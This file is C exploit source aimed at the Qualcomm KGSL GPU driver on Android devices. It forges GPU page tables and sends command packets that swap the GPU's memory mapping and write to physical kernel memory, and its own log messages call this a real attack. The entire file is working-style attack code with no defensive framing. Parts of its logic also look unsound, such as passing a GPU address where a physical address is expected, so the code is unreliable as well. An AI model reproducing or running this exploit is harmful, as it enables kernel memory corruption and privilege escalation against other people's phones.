#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdint.h>

#define PHYS_BASE 0x80000000ULL
#define SWAPPER_PG_DIR_OFF 0x0000000001755000ULL
#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(0x09, 0x13, struct kgsl_drawctxt_create)
#define IOCTL_KGSL_MAP_USER_MEM _IOWR(0x09, 0x15, struct kgsl_map_user_mem)
#define IOCTL_KGSL_GPU_COMMAND _IOWR(0x09, 0x4A, struct kgsl_gpu_command)

struct kgsl_drawctxt_create { unsigned int flags; unsigned int drawctxt_id; };
struct kgsl_map_user_mem { int fd; unsigned long gpuaddr; size_t len; size_t offset; unsigned long hostptr; unsigned int memtype; unsigned int flags; };
struct kgsl_gpu_command { uint64_t flags; uint64_t cmdlist; unsigned int cmdsize; unsigned int numcmds; uint64_t objlist; unsigned int objsize; unsigned int numobjs; uint64_t synclist; unsigned int syncsize; unsigned int numsyncs; unsigned int context_id; unsigned int timestamp; };

#define CP_TYPE7_PKT(op, size) ((0xC << 28) | ((op) << 23) | (size))
#define CP_WAIT_FOR_ME 0x14
#define CP_WAIT_FOR_IDLE 0x15
#define CP_MEM_WRITE 0x22
#define CP_SMMU_TABLE_UPDATE 0xD3

static inline uint32_t cp_type7_packet(uint32_t opcode, uint32_t size) { return CP_TYPE7_PKT(opcode, size); }
static inline uint32_t cp_gpuaddr(uint32_t* cmds, uint64_t gpuaddr) {
    cmds[0] = (uint32_t)(gpuaddr & 0xFFFFFFFF);
    cmds[1] = (uint32_t)((gpuaddr >> 32) & 0xFFFFFFFF);
    return 2;
}

int setup_pagetables(uint8_t *tt0, uint64_t tt0phys, uint64_t fake_gpuaddr, uint64_t target_pa) {
    uint64_t *level_base = (uint64_t *)tt0;
    memset(level_base, 0, 4096);
    uint64_t level1_index = (fake_gpuaddr >> 30) & 0x1FF;
    uint64_t level2_index = (fake_gpuaddr >> 21) & 0x1FF;
    uint64_t level3_index = (fake_gpuaddr >> 12) & 0x1FF;
    level_base[level1_index] = (uint64_t) tt0phys | 0x3;
    level_base[level2_index] = (uint64_t) tt0phys | 0x3;
    level_base[level3_index] = (uint64_t) (target_pa | 0x3 | (1 << 6) | (3 << 2) | (2 << 8) | (1 << 10) | (1 << 11));
    level_base[1] = (uint64_t) tt0phys | 0x3;
    level_base[2] = (uint64_t) tt0phys | 0x3;
    return 0;
}

int DoWrite(int fd, int ctx_id, uint32_t* payload_buf, uint64_t payload_gpuaddr, uint64_t phyaddr, uint64_t write_addr) {
    uint32_t* drawstate_buf = payload_buf + 0x100;
    uint32_t* drawstate_cmds = drawstate_buf;
    *drawstate_cmds++ = cp_type7_packet(CP_SMMU_TABLE_UPDATE, 4);
    drawstate_cmds += cp_gpuaddr(drawstate_cmds, phyaddr);
    *drawstate_cmds++ = 0; *drawstate_cmds++ = 0;
    *drawstate_cmds++ = cp_type7_packet(CP_MEM_WRITE, 4);
    drawstate_cmds += cp_gpuaddr(drawstate_cmds, write_addr);
    *drawstate_cmds++ = 0x41414141;

    uint32_t* payload_cmds = payload_buf;
    *payload_cmds++ = cp_type7_packet(0xE3, 1); *payload_cmds++ = 1;
    *payload_cmds++ = cp_type7_packet(0x43, 3);
    *payload_cmds++ = (drawstate_cmds - drawstate_buf) | (0x7 << 20);
    payload_cmds += cp_gpuaddr(payload_cmds, payload_gpuaddr + 0x100*4);

    uint32_t cmd_size = (payload_cmds - payload_buf) * 4;
    struct kgsl_gpu_command cmd_req = { .context_id = ctx_id, .numcmds = 1, .cmdlist = (uint64_t)payload_gpuaddr, .cmdsize = cmd_size };
    return ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &cmd_req);
}

int main() {
    printf("[*] 开始基于正确的 IOCTL 命令码发起真实攻击...\n");

    int fd = open("/dev/kgsl-3d0", O_RDWR);
    struct kgsl_drawctxt_create create_req = { .flags = 0x00001812 };
    ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &create_req);
    printf("[+] 创建 GPU 上下文成功，ID: %u\n", create_req.drawctxt_id);

    void *fake_page = mmap(NULL, 0x10000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    struct kgsl_map_user_mem map_req = { .hostptr = (unsigned long)fake_page, .len = 0x10000, .memtype = 2 };
    ioctl(fd, IOCTL_KGSL_MAP_USER_MEM, &map_req);
    printf("[+] GPU 映射成功，GPU 地址: 0x%lx\n", map_req.gpuaddr);

    setup_pagetables((uint8_t*)fake_page, (uint64_t)map_req.gpuaddr, 0x40403000ULL, PHYS_BASE);

    printf("[!] 正在发送 GPU 命令包，尝试向物理基址 0x80000000 写入无效地址...\n");
    int ret = DoWrite(fd, create_req.drawctxt_id, (uint32_t*)fake_page, map_req.gpuaddr, map_req.gpuaddr, 0x40403000ULL);

    if (ret < 0) perror("[-] KGSL 攻击命令发送失败");
    else printf("[+] 攻击命令已成功发送到 GPU。\n");
    return 0;
}